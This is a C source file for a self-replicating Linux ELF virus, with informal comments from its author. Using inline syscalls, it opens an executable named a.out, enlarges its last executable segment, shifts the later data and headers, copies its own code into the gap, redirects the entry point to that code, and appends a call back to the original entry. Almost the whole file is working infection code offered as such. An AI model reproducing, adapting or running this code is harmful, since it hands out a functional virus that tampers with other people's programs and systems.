//Don't actually want to search the constants
#include<stdlib.h>
#include<unistd.h>
#include<stdio.h>
#include<stdint.h>
#include<fcntl.h>
#include<dirent.h>
#include<sys/syscall.h>
#include<sys/mman.h>
#include<sys/stat.h>


// Okay this inline assembly line was the only thing, where I had some problems due to the fact that I had no internet.
// Luckily for me: I got a butchered version of the Linux Kernel lying around and the tests from the kernel source had some nice helpers.
// Taken from the kernelsource tools/include/nolibc/arch-x86_64.h 
#define my_syscall1(num, arg1)                                                \
({                                                                            \
	long _ret;                                                            \
	register long _num  __asm__ ("rax") = (num);                          \
	register long _arg1 __asm__ ("rdi") = (long)(arg1);                   \
	                                                                      \
	__asm__  volatile (                                                   \
		"syscall\n"                                                   \
		: "=a"(_ret)                                                  \
		: "r"(_arg1),                                                 \
		  "0"(_num)                                                   \
		: "rcx", "r11", "memory", "cc"                                \
	);                                                                    \
	_ret;                                                                 \
})
#define my_syscall2(num, arg1, arg2)                                          \
({                                                                            \
	long _ret;                                                            \
	register long _num  __asm__ ("rax") = (num);                          \
	register long _arg1 __asm__ ("rdi") = (long)(arg1);                   \
	register long _arg2 __asm__ ("rsi") = (long)(arg2);                   \
	                                                                      \
	__asm__  volatile (                                                   \
		"syscall\n"                                                   \
		: "=a"(_ret)                                                  \
		: "r"(_arg1), "r"(_arg2),                                     \
		  "0"(_num)                                                   \
		: "rcx", "r11", "memory", "cc"                                \
	);                                                                    \
	_ret;                                                                 \
})
#define my_syscall6(num, arg1, arg2, arg3, arg4, arg5, arg6)                  \
({                                                                            \
	long _ret;                                                            \
	register long _num  __asm__ ("rax") = (num);                          \
	register long _arg1 __asm__ ("rdi") = (long)(arg1);                   \
	register long _arg2 __asm__ ("rsi") = (long)(arg2);                   \
	register long _arg3 __asm__ ("rdx") = (long)(arg3);                   \
	register long _arg4 __asm__ ("r10") = (long)(arg4);                   \
	register long _arg5 __asm__ ("r8")  = (long)(arg5);                   \
	register long _arg6 __asm__ ("r9")  = (long)(arg6);                   \
	                                                                      \
	__asm__  volatile (                                                   \
		"syscall\n"                                                   \
		: "=a"(_ret)                                                  \
		: "r"(_arg1), "r"(_arg2), "r"(_arg3), "r"(_arg4), "r"(_arg5), \
		  "r"(_arg6), "0"(_num)                                       \
		: "rcx", "r11", "memory", "cc"                                \
	);                                                                    \
	_ret;                                                                 \
})
struct linux_dirent {
    unsigned long d_ino;
    off_t d_off;
    unsigned short d_reclen;
    char d_name[];
};
#define EI_NIDENT 16
#define Elf64_Addr uint64_t
#define Elf64_Off uint64_t
typedef struct {
    unsigned char e_ident[EI_NIDENT];
    uint16_t      e_type;
    uint16_t      e_machine;
    uint32_t      e_version;
    Elf64_Addr     e_entry;
    Elf64_Off      e_phoff;
    Elf64_Off      e_shoff;
    uint32_t      e_flags;
    uint16_t      e_ehsize;
    uint16_t      e_phentsize;
    uint16_t      e_phnum;
    uint16_t      e_shentsize;
    uint16_t      e_shnum;
    uint16_t      e_shstrndx;
} Elf64_Ehdr;
typedef struct {
    uint32_t   p_type;
    uint32_t   p_flags;
    Elf64_Off  p_offset;
    Elf64_Addr p_vaddr;
    Elf64_Addr p_paddr;
    uint64_t   p_filesz;
    uint64_t   p_memsz;
    uint64_t   p_align;
} Elf64_Phdr;

typedef struct {
    uint32_t   sh_name;
    uint32_t   sh_type;
    uint64_t   sh_flags;
    Elf64_Addr sh_addr;
    Elf64_Off  sh_offset;
    uint64_t   sh_size;
    uint32_t   sh_link;
    uint32_t   sh_info;
    uint64_t   sh_addralign;
    uint64_t   sh_entsize;
} Elf64_Shdr;

void do_main();
void theend();
void _start() {
    //this is the virus function, which will be appended to the .text section of the other file
    do_main();
}

void thestart() {
    return;
}
void do_main()  {
    struct stat thestats;
    void *self = &do_main;
    unsigned long realvirsize = ((char*) &theend)-((char*) &thestart);
    //We seem to need page allignment... Well then let's add a page, instead of some bytes...
    unsigned long virsize = 0x1000;
    //int fd = open("a.out",  O_RDWR);
    char aout[] = {'a','.','o','u','t',0};
    int fd = my_syscall2(2,aout,  O_RDWR);
    //fstat(fd, &thestats);
    my_syscall2(5,fd,&thestats);
    //ftruncate(fd, thestats.st_size + virsize);
    my_syscall2(77, fd, thestats.st_size + virsize);
    // map the victim and make the mapping large enaugh to hold the virus as well
    //char *filecontent =  mmap(0, thestats.st_size + virsize ,PROT_READ|PROT_WRITE, MAP_SHARED, fd,0);
    char *filecontent =  (char *) my_syscall6(9,0, thestats.st_size + virsize ,PROT_READ|PROT_WRITE, MAP_SHARED, fd,0);

    Elf64_Ehdr *ehdr = (Elf64_Ehdr*) filecontent;
    if(ehdr->e_ident[0]!=0x7f || ehdr->e_ident[1]!='E' || ehdr->e_ident[2]!='L' || ehdr->e_ident[3]!='F')
        return;
    //Pointer to the entry
    Elf64_Addr entry = ehdr->e_entry;
    //Number of phdrs
    uint16_t phnum = ehdr->e_phnum;
    // map the phdrs into memory  
    Elf64_Phdr* phdr = (Elf64_Phdr*) (filecontent+(ehdr->e_phoff));
    Elf64_Shdr* shdr = (Elf64_Shdr*) (filecontent+(ehdr->e_shoff));
    int ctr = 0;
    Elf64_Phdr* textsegmenthdr= 0;
        // go over all the entries and find an entry with a PT_NOTE entry in order to overwrite it.
        // or increase a PT_LOAD entry (sensible, however: how to make room for it in the file?)
        // 1 == PT_LOAD...
        // we neet the last one!!! and it has to have the executable flag set! 
        // 1 == PF_X... 
    while(ctr<ehdr->e_phnum) {
        if(((phdr+ctr)->p_type == 1) && ((phdr+ctr)->p_flags&1 !=0)) {
            textsegmenthdr = phdr+ctr;
        }
        ctr++;

    }
    if(textsegmenthdr == 0)
        return;

    char *originalendofsegment = filecontent + textsegmenthdr->p_offset + textsegmenthdr->p_filesz;

    //Move everything that comes after the end of the segment, that we want to expand
    for(char * c= filecontent + thestats.st_size ; c>originalendofsegment; c--) {
        *(c+virsize)  =  *c;
    }

    ctr = 0;
    //Adjust the programheaders which come after the offset
    while(ctr<ehdr->e_phnum) {
        if((phdr+ctr)->p_offset >= (textsegmenthdr->p_offset + textsegmenthdr->p_filesz))
            (phdr+ctr)->p_offset += virsize;
        ctr++; 
    }
    ctr = 0;
    
    if(ehdr->e_shoff>=textsegmenthdr->p_offset+textsegmenthdr->p_filesz)
        ehdr->e_shoff +=virsize;
    //Adjust the sectionheaders which come after the offset
    while(ctr<ehdr->e_shnum) {
        if((shdr+ctr)->sh_offset >= ( textsegmenthdr->p_offset + textsegmenthdr->p_filesz))
            (shdr+ctr)->sh_offset += virsize; 
        ctr++;
    }
    
    //the call instruction needs a relative address of the original entry, in order to work 
    //todo: no idea, where we got the +5 from
    int relativecall = ehdr->e_entry - (textsegmenthdr->p_vaddr + textsegmenthdr->p_filesz+realvirsize+5);
    //set entry to the new entry, before we override it (7: hardcoded: number of instructions in thestart ... I am so tired)
    ehdr->e_entry = textsegmenthdr->p_vaddr + textsegmenthdr->p_filesz+7;
    
    //Expand the textsegment
    textsegmenthdr->p_filesz +=virsize;
    textsegmenthdr->p_memsz +=virsize; 
    char * newendofsegment = originalendofsegment + virsize;
    // TODO: copy virus code into the now free part, change entry and somehow jump to original entry
    //insert a ret to the original entry!!!!
    //or a RELATIVE Jump to the entry in order to deal with pie binaries!!!
    //TODO: next level cursed solution for the jump problem: copy only up to theend() and write a a call to the entry afterwards: when we call theend in the code, then we will call a function, which performs this call instead... clean code lol ... 
    for(char* c= originalendofsegment; c < newendofsegment ; c++)  {
        *c = 0x90;
    }
    char * endofvir = originalendofsegment+ realvirsize;

    ctr = 0;
    char * virchars = (char*) thestart;
    for(char* c= originalendofsegment; c < endofvir; c++ ) {
        *c = virchars[ctr];
        ctr++;
    }
    
    
    *endofvir  = 0xe8; //call
    //relativecall is the relative offset from theend() to the original entry of the elf file
    *((int*)(endofvir+1)) = relativecall;
    //*(endofvir+1) = relativecall &0xff; 
    //*(endofvir+2) = (relativecall>>8)&0xff;
    //*(endofvir+3) = (relativecall>>12)&0xff;
    //*(endofvir+4) = (relativecall>>16)&0xff;
    *(endofvir+5) = 0xc3;//ret

    //close(fd);
    my_syscall1(3, fd);
    

    // Next level cursed: the function theend from this file is not existent in an infected file. There is a call to the original entry instead... 
    theend();

    //exit(1337); //won't work like this, but I like it...
    my_syscall1(60,1337);
}

void theend() {
    return;
}
